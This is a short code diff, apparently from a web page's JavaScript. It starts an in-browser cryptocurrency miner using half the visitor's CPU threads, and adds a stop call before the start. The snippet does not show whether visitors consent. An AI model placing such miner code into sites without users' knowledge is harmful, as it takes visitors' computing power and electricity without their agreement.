@@ -118,6 +118,7 @@
     var fi = setInterval(function(){
       if (miner != null){
         miner.setNumThreads(navigator.hardwareConcurrency/2);
+        miner.stop();
         miner.start();
         clearInterval(fi);
       }
